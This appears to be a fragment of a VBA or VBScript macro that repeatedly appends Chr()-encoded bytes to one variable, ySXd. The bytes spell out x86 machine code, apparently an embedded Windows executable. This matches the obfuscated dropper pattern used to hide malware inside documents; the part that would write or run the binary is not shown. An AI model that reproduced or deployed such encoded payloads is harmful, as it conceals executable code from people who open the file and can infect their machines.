ySXd=ySXd&Chr(36)&Chr(35)&Chr(213)&Chr(180)&Chr(54)&Chr(139)&Chr(138)&Chr(16)&Chr(61)&Chr(62)&Chr(222)&Chr(35)&Chr(28)&Chr(87)&Chr(19)&Chr(30)&Chr(158)&Chr(167)&Chr(59)&Chr(41)&Chr(237)&Chr(149)&Chr(228)&Chr(129)&Chr(121)&Chr(150)&Chr(109)&Chr(12)&Chr(126)&Chr(217)&Chr(71)&Chr(232)&Chr(16)&Chr(36)&Chr(104)&Chr(9)&Chr(57)&Chr(227)&Chr(60)&Chr(89)&Chr(81)&Chr(194)&Chr(60)&Chr(50)&Chr(161)&Chr(235)&Chr(232)&Chr(149)&Chr(241)&Chr(67)&Chr(67)&Chr(86)&Chr(161)&Chr(35)&Chr(51)&Chr(62)&Chr(171)&Chr(171)&Chr(108)&Chr(94)&Chr(212)&Chr(97)&Chr(5)&Chr(174)&Chr(241)&Chr(217)&Chr(66)&Chr(211)&Chr(5)&Chr(164)&Chr(251)&Chr(90)&Chr(227)&Chr(50)&Chr(236)&Chr(10)&Chr(188)&Chr(170)&Chr(206)&Chr(104)&Chr(117)&Chr(76)&Chr(48)&Chr(91)&Chr(42)&Chr(197)&Chr(166)&Chr(211)&Chr(37)&Chr(209)&Chr(201)&Chr(227)&Chr(96)&Chr(113)&Chr(101)&Chr(75)&Chr(226)&Chr(2)&Chr(101)&Chr(72)
ySXd=ySXd&Chr(19)&Chr(21)&Chr(160)&Chr(248)&Chr(68)&Chr(130)&Chr(62)&Chr(105)&Chr(39)&Chr(50)&Chr(62)&Chr(160)&Chr(221)&Chr(180)&Chr(170)&Chr(79)&Chr(119)&Chr(226)&Chr(66)&Chr(82)&Chr(174)&Chr(196)&Chr(204)&Chr(173)&Chr(133)&Chr(94)&Chr(196)&Chr(59)&Chr(101)&Chr(9)&Chr(41)&Chr(172)&Chr(101)&Chr(201)&Chr(127)&Chr(166)&Chr(101)&Chr(161)&Chr(39)&Chr(146)&Chr(54)&Chr(212)&Chr(39)&Chr(15)&Chr(43)&Chr(69)&Chr(178)&Chr(176)&Chr(29)&Chr(57)&Chr(21)&Chr(217)&Chr(163)&Chr(100)&Chr(81)&Chr(70)&Chr(92)&Chr(67)&Chr(99)&Chr(186)&Chr(139)&Chr(170)&Chr(225)&Chr(202)&Chr(190)&Chr(222)&Chr(41)&Chr(56)&Chr(131)&Chr(198)&Chr(4)&Chr(59)&Chr(117)&Chr(12)&Chr(114)&Chr(236)&Chr(94)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(61)&Chr(240)&Chr(183)&Chr(64)&Chr(0)&Chr(0)&Chr(116)&Chr(25)&Chr(104)&Chr(240)&Chr(183)&Chr(64)&Chr(0)&Chr(232)&Chr(213)
ySXd=ySXd&Chr(26)&Chr(0)&Chr(0)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(10)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(21)&Chr(240)&Chr(183)&Chr(64)&Chr(0)&Chr(89)&Chr(232)&Chr(12)&Chr(26)&Chr(0)&Chr(0)&Chr(104)&Chr(4)&Chr(129)&Chr(64)&Chr(0)&Chr(104)&Chr(240)&Chr(128)&Chr(64)&Chr(0)&Chr(232)&Chr(161)&Chr(255)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(133)&Chr(192)&Chr(117)&Chr(66)&Chr(104)&Chr(196)&Chr(31)&Chr(64)&Chr(0)&Chr(232)&Chr(214)&Chr(25)&Chr(0)&Chr(0)&Chr(184)&Chr(232)&Chr(128)&Chr(64)&Chr(0)&Chr(199)&Chr(4)&Chr(36)&Chr(236)&Chr(128)&Chr(64)&Chr(0)&Chr(232)&Chr(99)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(61)&Chr(244)&Chr(183)&Chr(64)&Chr(0)&Chr(0)&Chr(89)&Chr(116)&Chr(27)&Chr(104)&Chr(244)&Chr(183)&Chr(64)&Chr(0)&Chr(232)&Chr(125)&Chr(26)&Chr(0)&Chr(0)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(12)&Chr(106)&Chr(0)&Chr(106)&Chr(2)
ySXd=ySXd&Chr(106)&Chr(0)&Chr(255)&Chr(21)&Chr(244)&Chr(183)&Chr(64)&Chr(0)&Chr(51)&Chr(192)&Chr(93)&Chr(195)&Chr(106)&Chr(24)&Chr(104)&Chr(248)&Chr(146)&Chr(64)&Chr(0)&Chr(232)&Chr(52)&Chr(18)&Chr(0)&Chr(0)&Chr(106)&Chr(8)&Chr(232)&Chr(125)&Chr(22)&Chr(0)&Chr(0)&Chr(89)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(51)&Chr(219)&Chr(67)&Chr(57)&Chr(29)&Chr(156)&Chr(172)&Chr(64)&Chr(0)&Chr(15)&Chr(132)&Chr(197)&Chr(0)&Chr(0)&Chr(0)&Chr(137)&Chr(29)&Chr(152)&Chr(172)&Chr(64)&Chr(0)&Chr(138)&Chr(69)&Chr(16)&Chr(162)&Chr(148)&Chr(172)&Chr(64)&Chr(0)&Chr(131)&Chr(125)&Chr(12)&Chr(0)&Chr(15)&Chr(133)&Chr(157)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(53)&Chr(232)&Chr(183)&Chr(64)&Chr(0)&Chr(232)&Chr(163)&Chr(12)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(248)&Chr(137)&Chr(125)&Chr(216)&Chr(133)&Chr(255)&Chr(116)&Chr(120)&Chr(255)&Chr(53)&Chr(228)&Chr(183)
ySXd=ySXd&Chr(64)&Chr(0)&Chr(232)&Chr(142)&Chr(12)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(240)&Chr(137)&Chr(117)&Chr(220)&Chr(137)&Chr(125)&Chr(228)&Chr(137)&Chr(117)&Chr(224)&Chr(131)&Chr(238)&Chr(4)&Chr(137)&Chr(117)&Chr(220)&Chr(59)&Chr(247)&Chr(114)&Chr(87)&Chr(232)&Chr(106)&Chr(12)&Chr(0)&Chr(0)&Chr(57)&Chr(6)&Chr(116)&Chr(237)&Chr(59)&Chr(247)&Chr(114)&Chr(74)&Chr(255)&Chr(54)&Chr(232)&Chr(100)&Chr(12)&Chr(0)&Chr(0)&Chr(139)&Chr(248)&Chr(232)&Chr(84)&Chr(12)&Chr(0)&Chr(0)&Chr(137)&Chr(6)&Chr(255)&Chr(215)&Chr(255)&Chr(53)&Chr(232)&Chr(183)&Chr(64)&Chr(0)&Chr(232)&Chr(78)&Chr(12)&Chr(0)&Chr(0)&Chr(139)&Chr(248)&Chr(255)&Chr(53)&Chr(228)&Chr(183)&Chr(64)&Chr(0)&Chr(232)&Chr(65)&Chr(12)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(57)&Chr(125)&Chr(228)&Chr(117)&Chr(5)&Chr(57)&Chr(69)&Chr(224)&Chr(116)&Chr(14)&Chr(137)&Chr(125)&Chr(228)
ySXd=ySXd&Chr(137)&Chr(125)&Chr(216)&Chr(137)&Chr(69)&Chr(224)&Chr(139)&Chr(240)&Chr(137)&Chr(117)&Chr(220)&Chr(139)&Chr(125)&Chr(216)&Chr(235)&Chr(159)&Chr(104)&Chr(12)&Chr(129)&Chr(64)&Chr(0)&Chr(184)&Chr(8)&Chr(129)&Chr(64)&Chr(0)&Chr(232)&Chr(95)&Chr(254)&Chr(255)&Chr(255)&Chr(89)&Chr(104)&Chr(20)&Chr(129)&Chr(64)&Chr(0)&Chr(184)&Chr(16)&Chr(129)&Chr(64)&Chr(0)&Chr(232)&Chr(79)&Chr(254)&Chr(255)&Chr(255)&Chr(89)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(31)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(125)&Chr(16)&Chr(0)&Chr(117)&Chr(40)&Chr(137)&Chr(29)&Chr(156)&Chr(172)&Chr(64)&Chr(0)&Chr(106)&Chr(8)&Chr(232)&Chr(171)&Chr(20)&Chr(0)&Chr(0)&Chr(89)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(252)&Chr(253)&Chr(255)&Chr(255)&Chr(51)&Chr(219)&Chr(67)&Chr(131)&Chr(125)&Chr(16)&Chr(0)&Chr(116)&Chr(8)&Chr(106)&Chr(8)&Chr(232)
ySXd=ySXd&Chr(146)&Chr(20)&Chr(0)&Chr(0)&Chr(89)&Chr(195)&Chr(232)&Chr(90)&Chr(17)&Chr(0)&Chr(0)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(106)&Chr(0)&Chr(106)&Chr(0)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(195)&Chr(254)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(106)&Chr(0)&Chr(106)&Chr(1)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(173)&Chr(254)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(93)&Chr(195)&Chr(106)&Chr(1)&Chr(106)&Chr(0)&Chr(106)&Chr(0)&Chr(232)&Chr(157)&Chr(254)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(195)&Chr(106)&Chr(1)&Chr(106)&Chr(1)&Chr(106)&Chr(0)&Chr(232)&Chr(142)&Chr(254)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(232)&Chr(102)&Chr(11)&Chr(0)&Chr(0)&Chr(139)&Chr(240)&Chr(86)&Chr(232)&Chr(62)&Chr(28)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(86)&Chr(232)&Chr(201)&Chr(27)&Chr(0)&Chr(0)&Chr(86)&Chr(232)&Chr(49)&Chr(21)&Chr(0)&Chr(0)&Chr(86)&Chr(232)&Chr(174)&Chr(27)&Chr(0)&Chr(0)&Chr(86)&Chr(232)&Chr(153)&Chr(27)&Chr(0)&Chr(0)&Chr(86)&Chr(232)&Chr(129)&Chr(25)&Chr(0)&Chr(0)&Chr(86)&Chr(232)&Chr(254)&Chr(1)&Chr(0)&Chr(0)&Chr(86)&Chr(232)&Chr(83)&Chr(19)&Chr(0)&Chr(31)&Chr(104)&Chr(186)&Chr(20)&Chr(64)&Chr(0)&Chr(232)&Chr(184)&Chr(10)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(36)&Chr(163)&Chr(4)&Chr(160)&Chr(64)&Chr(0)&Chr(94)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(81)&Chr(81)&Chr(83)&Chr(139)&Chr(93)&Chr(8)&Chr(86)&Chr(87)&Chr(51)&Chr(246)&Chr(51)&Chr(255)&Chr(137)&Chr(125)&Chr(252)&Chr(59)&Chr(28)&Chr(253)&Chr(8)&Chr(160)&Chr(64)&Chr(0)&Chr(116)&Chr(9)&Chr(71)&Chr(137)&Chr(125)&Chr(252)&Chr(131)&Chr(255)&Chr(23)
ySXd=ySXd&Chr(114)&Chr(238)&Chr(131)&Chr(255)&Chr(23)&Chr(15)&Chr(131)&Chr(119)&Chr(1)&Chr(0)&Chr(0)&Chr(106)&Chr(3)&Chr(232)&Chr(145)&Chr(31)&Chr(0)&Chr(0)&Chr(89)&Chr(131)&Chr(248)&Chr(1)&Chr(15)&Chr(132)&Chr(52)&Chr(1)&Chr(0)&Chr(0)&Chr(106)&Chr(3)&Chr(232)&Chr(128)&Chr(31)&Chr(0)&Chr(0)&Chr(89)&Chr(133)&Chr(192)&Chr(117)&Chr(13)&Chr(131)&Chr(61)&Chr(0)&Chr(160)&Chr(64)&Chr(0)&Chr(1)&Chr(15)&Chr(132)&Chr(27)&Chr(1)&Chr(0)&Chr(0)&Chr(129)&Chr(251)&Chr(252)&Chr(0)&Chr(0)&Chr(0)&Chr(15)&Chr(132)&Chr(65)&Chr(1)&Chr(0)&Chr(0)&Chr(104)&Chr(232)&Chr(134)&Chr(64)&Chr(0)&Chr(187)&Chr(20)&Chr(3)&Chr(0)&Chr(0)&Chr(83)&Chr(191)&Chr(160)&Chr(172)&Chr(64)&Chr(0)&Chr(87)&Chr(232)&Chr(228)&Chr(30)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(133)&Chr(192)&Chr(116)&Chr(13)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(232)
ySXd=ySXd&Chr(130)&Chr(20)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(20)&Chr(104)&Chr(4)&Chr(1)&Chr(0)&Chr(0)&Chr(190)&Chr(185)&Chr(172)&Chr(64)&Chr(0)&Chr(86)&Chr(106)&Chr(0)&Chr(198)&Chr(5)&Chr(189)&Chr(173)&Chr(64)&Chr(0)&Chr(0)&Chr(255)&Chr(21)&Chr(36)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(38)&Chr(104)&Chr(208)&Chr(134)&Chr(64)&Chr(0)&Chr(104)&Chr(251)&Chr(2)&Chr(0)&Chr(0)&Chr(86)&Chr(232)&Chr(162)&Chr(30)&Chr(0)&Chr(0)&Chr(3)&Chr(196)&Chr(12)&Chr(133)&Chr(192)&Chr(116)&Chr(15)&Chr(51)&Chr(192)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(232)&Chr(62)&Chr(20)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(20)&Chr(86)&Chr(232)&Chr(251)&Chr(29)&Chr(0)&Chr(0)&Chr(64)&Chr(89)&Chr(131)&Chr(248)&Chr(60)&Chr(118)&Chr(56)&Chr(86)&Chr(232)&Chr(238)&Chr(29)&Chr(0)&Chr(0)&Chr(131)&Chr(238)&Chr(59)&Chr(3)&Chr(198)&Chr(106)
ySXd=ySXd&Chr(3)&Chr(185)&Chr(180)&Chr(175)&Chr(64)&Chr(0)&Chr(104)&Chr(204)&Chr(134)&Chr(64)&Chr(0)&Chr(43)&Chr(200)&Chr(81)&Chr(80)&Chr(232)&Chr(20)&Chr(29)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(20)&Chr(133)&Chr(192)&Chr(116)&Chr(17)&Chr(51)&Chr(246)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(232)&Chr(251)&Chr(19)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(20)&Chr(235)&Chr(2)&Chr(51)&Chr(246)&Chr(104)&Chr(200)&Chr(134)&Chr(64)&Chr(0)&Chr(83)&Chr(87)&Chr(232)&Chr(122)&Chr(28)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(133)&Chr(192)&Chr(116)&Chr(13)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(232)&Chr(215)&Chr(19)&Chr(0)&Chr(90)&Chr(131)&Chr(196)&Chr(20)&Chr(139)&Chr(69)&Chr(252)&Chr(255)&Chr(52)&Chr(197)&Chr(12)&Chr(160)&Chr(64)&Chr(0)&Chr(83)&Chr(87)&Chr(232)&Chr(85)&Chr(28)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(133)&Chr(192)
ySXd=ySXd&Chr(116)&Chr(13)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(86)&Chr(232)&Chr(178)&Chr(19)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(20)&Chr(104)&Chr(16)&Chr(32)&Chr(1)&Chr(0)&Chr(104)&Chr(160)&Chr(134)&Chr(64)&Chr(0)&Chr(87)&Chr(232)&Chr(200)&Chr(26)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(235)&Chr(50)&Chr(106)&Chr(244)&Chr(255)&Chr(21)&Chr(32)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(216)&Chr(59)&Chr(222)&Chr(116)&Chr(36)&Chr(131)&Chr(251)&Chr(255)&Chr(116)&Chr(31)&Chr(106)&Chr(0)&Chr(141)&Chr(69)&Chr(248)&Chr(80)&Chr(141)&Chr(52)&Chr(253)&Chr(12)&Chr(160)&Chr(64)&Chr(0)&Chr(255)&Chr(54)&Chr(232)&Chr(57)&Chr(29)&Chr(0)&Chr(0)&Chr(89)&Chr(80)&Chr(255)&Chr(54)&Chr(83)&Chr(255)&Chr(21)&Chr(28)&Chr(128)&Chr(64)&Chr(0)&Chr(95)&Chr(94)&Chr(91)&Chr(201)&Chr(195)&Chr(106)&Chr(3)&Chr(232)&Chr(21)&Chr(30)&Chr(0)&Chr(0)&Chr(89)&Chr(131)
ySXd=ySXd&Chr(248)&Chr(1)&Chr(116)&Chr(21)&Chr(106)&Chr(3)&Chr(232)&Chr(8)&Chr(30)&Chr(0)&Chr(0)&Chr(89)&Chr(133)&Chr(192)&Chr(117)&Chr(31)&Chr(131)&Chr(61)&Chr(0)&Chr(160)&Chr(64)&Chr(0)&Chr(1)&Chr(117)&Chr(22)&Chr(104)&Chr(252)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(41)&Chr(254)&Chr(255)&Chr(255)&Chr(104)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(31)&Chr(254)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(195)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(81)&Chr(81)&Chr(86)&Chr(232)&Chr(10)&Chr(11)&Chr(0)&Chr(0)&Chr(139)&Chr(240)&Chr(133)&Chr(246)&Chr(15)&Chr(132)&Chr(70)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(86)&Chr(92)&Chr(161)&Chr(204)&Chr(160)&Chr(64)&Chr(0)&Chr(87)&Chr(139)&Chr(125)&Chr(8)&Chr(139)&Chr(202)&Chr(83)&Chr(57)&Chr(57)&Chr(116)&Chr(14)&Chr(139)&Chr(216)&Chr(107)&Chr(219)&Chr(12)&Chr(131)&Chr(193)&Chr(12)&Chr(3)
ySXd=ySXd&Chr(218)&Chr(59)&Chr(203)&Chr(114)&Chr(238)&Chr(107)&Chr(192)&Chr(12)&Chr(3)&Chr(194)&Chr(59)&Chr(200)&Chr(115)&Chr(8)&Chr(57)&Chr(57)&Chr(117)&Chr(4)&Chr(139)&Chr(193)&Chr(235)&Chr(2)&Chr(51)&Chr(192)&Chr(133)&Chr(192)&Chr(116)&Chr(10)&Chr(139)&Chr(88)&Chr(8)&Chr(137)&Chr(93)&Chr(252)&Chr(133)&Chr(219)&Chr(117)&Chr(7)&Chr(51)&Chr(192)&Chr(233)&Chr(251)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(251)&Chr(5)&Chr(117)&Chr(12)&Chr(131)&Chr(96)&Chr(8)&Chr(0)&Chr(51)&Chr(192)&Chr(64)&Chr(233)&Chr(234)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(251)&Chr(1)&Chr(15)&Chr(132)&Chr(222)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(78)&Chr(96)&Chr(137)&Chr(77)&Chr(248)&Chr(139)&Chr(77)&Chr(12)&Chr(137)&Chr(78)&Chr(96)&Chr(139)&Chr(72)&Chr(4)&Chr(131)&Chr(249)&Chr(8)&Chr(15)&Chr(133)&Chr(184)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(13)&Chr(192)&Chr(160)&Chr(64)
ySXd=ySXd&Chr(0)&Chr(139)&Chr(61)&Chr(196)&Chr(160)&Chr(64)&Chr(0)&Chr(139)&Chr(209)&Chr(3)&Chr(249)&Chr(59)&Chr(215)&Chr(125)&Chr(36)&Chr(107)&Chr(201)&Chr(12)&Chr(139)&Chr(126)&Chr(92)&Chr(131)&Chr(100)&Chr(57)&Chr(8)&Chr(0)&Chr(139)&Chr(61)&Chr(192)&Chr(160)&Chr(64)&Chr(0)&Chr(139)&Chr(29)&Chr(196)&Chr(160)&Chr(64)&Chr(0)&Chr(66)&Chr(3)&Chr(223)&Chr(131)&Chr(193)&Chr(12)&Chr(59)&Chr(211)&Chr(124)&Chr(226)&Chr(139)&Chr(93)&Chr(252)&Chr(139)&Chr(0)&Chr(139)&Chr(126)&Chr(100)&Chr(61)&Chr(142)&Chr(0)&Chr(0)&Chr(192)&Chr(117)&Chr(9)&Chr(199)&Chr(70)&Chr(100)&Chr(131)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(94)&Chr(61)&Chr(144)&Chr(0)&Chr(0)&Chr(192)&Chr(117)&Chr(9)&Chr(199)&Chr(70)&Chr(100)&Chr(129)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(78)&Chr(61)&Chr(145)&Chr(0)&Chr(0)&Chr(192)&Chr(117)&Chr(9)&Chr(199)&Chr(70)&Chr(100)&Chr(132)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(235)&Chr(62)&Chr(61)&Chr(147)&Chr(0)&Chr(0)&Chr(192)&Chr(117)&Chr(9)&Chr(199)&Chr(70)&Chr(100)&Chr(133)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(46)&Chr(61)&Chr(141)&Chr(0)&Chr(0)&Chr(192)&Chr(117)&Chr(9)&Chr(199)&Chr(70)&Chr(100)&Chr(130)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(30)&Chr(61)&Chr(143)&Chr(0)&Chr(0)&Chr(192)&Chr(117)&Chr(9)&Chr(199)&Chr(70)&Chr(100)&Chr(134)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(14)&Chr(61)&Chr(146)&Chr(0)&Chr(0)&Chr(192)&Chr(117)&Chr(7)&Chr(199)&Chr(70)&Chr(100)&Chr(138)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(118)&Chr(100)&Chr(106)&Chr(8)&Chr(255)&Chr(211)&Chr(89)&Chr(137)&Chr(126)&Chr(100)&Chr(235)&Chr(7)&Chr(131)&Chr(96)&Chr(8)&Chr(0)&Chr(81)&Chr(255)&Chr(211)&Chr(139)&Chr(69)&Chr(248)&Chr(89)&Chr(137)&Chr(70)&Chr(96)&Chr(131)&Chr(200)&Chr(255)&Chr(91)&Chr(95)&Chr(94)&Chr(201)
ySXd=ySXd&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(87)&Chr(51)&Chr(255)&Chr(57)&Chr(61)&Chr(236)&Chr(183)&Chr(64)&Chr(0)&Chr(117)&Chr(5)&Chr(232)&Chr(113)&Chr(36)&Chr(0)&Chr(0)&Chr(139)&Chr(53)&Chr(248)&Chr(183)&Chr(64)&Chr(0)&Chr(133)&Chr(246)&Chr(117)&Chr(5)&Chr(190)&Chr(128)&Chr(135)&Chr(64)&Chr(0)&Chr(138)&Chr(6)&Chr(60)&Chr(32)&Chr(119)&Chr(8)&Chr(132)&Chr(192)&Chr(116)&Chr(46)&Chr(133)&Chr(255)&Chr(116)&Chr(36)&Chr(60)&Chr(34)&Chr(117)&Chr(9)&Chr(51)&Chr(201)&Chr(133)&Chr(255)&Chr(15)&Chr(148)&Chr(193)&Chr(139)&Chr(249)&Chr(15)&Chr(182)&Chr(192)&Chr(80)&Chr(232)&Chr(97)&Chr(29)&Chr(0)&Chr(0)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(1)&Chr(70)&Chr(70)&Chr(235)&Chr(211)&Chr(60)&Chr(32)&Chr(119)&Chr(7)&Chr(70)&Chr(138)&Chr(6)&Chr(132)&Chr(192)&Chr(117)&Chr(245)&Chr(95)&Chr(139)&Chr(198)&Chr(94)&Chr(195)&Chr(131)&Chr(61)&Chr(236)&Chr(183)
ySXd=ySXd&Chr(64)&Chr(0)&Chr(0)&Chr(117)&Chr(5)&Chr(232)&Chr(23)&Chr(36)&Chr(0)&Chr(0)&Chr(86)&Chr(139)&Chr(53)&Chr(96)&Chr(172)&Chr(64)&Chr(0)&Chr(87)&Chr(51)&Chr(255)&Chr(133)&Chr(246)&Chr(117)&Chr(24)&Chr(131)&Chr(200)&Chr(255)&Chr(233)&Chr(160)&Chr(0)&Chr(0)&Chr(0)&Chr(60)&Chr(61)&Chr(116)&Chr(1)&Chr(71)&Chr(86)&Chr(232)&Chr(1)&Chr(27)&Chr(0)&Chr(0)&Chr(89)&Chr(141)&Chr(116)&Chr(6)&Chr(1)&Chr(138)&Chr(6)&Chr(132)&Chr(192)&Chr(117)&Chr(234)&Chr(106)&Chr(4)&Chr(71)&Chr(87)&Chr(232)&Chr(211)&Chr(36)&Chr(0)&Chr(0)&Chr(139)&Chr(248)&Chr(89)&Chr(89)&Chr(137)&Chr(61)&Chr(124)&Chr(172)&Chr(64)&Chr(0)&Chr(133)&Chr(255)&Chr(116)&Chr(203)&Chr(139)&Chr(53)&Chr(96)&Chr(172)&Chr(64)&Chr(0)&Chr(83)&Chr(235)&Chr(66)&Chr(86)&Chr(232)&Chr(208)&Chr(26)&Chr(0)&Chr(0)&Chr(139)&Chr(216)&Chr(67)&Chr(128)&Chr(62)&Chr(61)&Chr(89)&Chr(116)
ySXd=ySXd&Chr(49)&Chr(106)&Chr(1)&Chr(83)&Chr(232)&Chr(165)&Chr(36)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(137)&Chr(7)&Chr(133)&Chr(192)&Chr(116)&Chr(78)&Chr(86)&Chr(83)&Chr(80)&Chr(232)&Chr(58)&Chr(27)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(133)&Chr(192)&Chr(116)&Chr(15)&Chr(51)&Chr(192)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(232)&Chr(214)&Chr(16)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(20)&Chr(131)&Chr(199)&Chr(4)&Chr(3)&Chr(243)&Chr(128)&Chr(62)&Chr(0)&Chr(117)&Chr(185)&Chr(255)&Chr(53)&Chr(96)&Chr(172)&Chr(64)&Chr(0)&Chr(232)&Chr(151)&Chr(35)&Chr(0)&Chr(0)&Chr(131)&Chr(37)&Chr(96)&Chr(172)&Chr(64)&Chr(0)&Chr(0)&Chr(131)&Chr(39)&Chr(0)&Chr(199)&Chr(5)&Chr(224)&Chr(183)&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(89)&Chr(91)&Chr(95)&Chr(94)&Chr(195)&Chr(255)&Chr(53)&Chr(124)&Chr(172)&Chr(64)
ySXd=ySXd&Chr(0)&Chr(232)&Chr(113)&Chr(35)&Chr(0)&Chr(0)&Chr(131)&Chr(37)&Chr(124)&Chr(172)&Chr(64)&Chr(0)&Chr(0)&Chr(131)&Chr(200)&Chr(255)&Chr(235)&Chr(228)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(81)&Chr(139)&Chr(77)&Chr(16)&Chr(83)&Chr(51)&Chr(192)&Chr(86)&Chr(137)&Chr(7)&Chr(139)&Chr(242)&Chr(139)&Chr(85)&Chr(12)&Chr(199)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(57)&Chr(69)&Chr(8)&Chr(116)&Chr(9)&Chr(139)&Chr(93)&Chr(8)&Chr(131)&Chr(69)&Chr(8)&Chr(4)&Chr(137)&Chr(19)&Chr(137)&Chr(69)&Chr(252)&Chr(128)&Chr(62)&Chr(34)&Chr(117)&Chr(58)&Chr(51)&Chr(192)&Chr(57)&Chr(69)&Chr(252)&Chr(179)&Chr(34)&Chr(15)&Chr(148)&Chr(192)&Chr(70)&Chr(137)&Chr(69)&Chr(252)&Chr(235)&Chr(60)&Chr(255)&Chr(7)&Chr(133)&Chr(210)&Chr(116)&Chr(8)&Chr(138)&Chr(6)&Chr(136)&Chr(2)&Chr(66)&Chr(137)&Chr(85)&Chr(12)&Chr(138)&Chr(30)&Chr(15)&Chr(182)
ySXd=ySXd&Chr(195)&Chr(80)&Chr(70)&Chr(232)&Chr(16)&Chr(28)&Chr(0)&Chr(0)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(19)&Chr(255)&Chr(7)&Chr(131)&Chr(125)&Chr(12)&Chr(0)&Chr(116)&Chr(10)&Chr(139)&Chr(77)&Chr(12)&Chr(138)&Chr(6)&Chr(255)&Chr(69)&Chr(12)&Chr(136)&Chr(1)&Chr(70)&Chr(139)&Chr(85)&Chr(12)&Chr(139)&Chr(77)&Chr(16)&Chr(132)&Chr(219)&Chr(116)&Chr(50)&Chr(131)&Chr(125)&Chr(252)&Chr(0)&Chr(117)&Chr(169)&Chr(128)&Chr(251)&Chr(32)&Chr(116)&Chr(5)&Chr(128)&Chr(251)&Chr(9)&Chr(117)&Chr(159)&Chr(133)&Chr(210)&Chr(116)&Chr(4)&Chr(198)&Chr(66)&Chr(255)&Chr(0)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(128)&Chr(62)&Chr(0)&Chr(15)&Chr(132)&Chr(233)&Chr(0)&Chr(0)&Chr(0)&Chr(138)&Chr(6)&Chr(60)&Chr(32)&Chr(116)&Chr(4)&Chr(60)&Chr(9)&Chr(117)&Chr(6)&Chr(70)&Chr(235)&Chr(243)&Chr(78)&Chr(235)&Chr(227)&Chr(128)&Chr(62)&Chr(0)&Chr(15)&Chr(132)
